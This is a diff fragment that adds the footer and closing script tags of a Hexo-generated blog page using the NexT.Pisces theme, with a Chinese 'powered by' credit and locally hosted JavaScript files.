+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
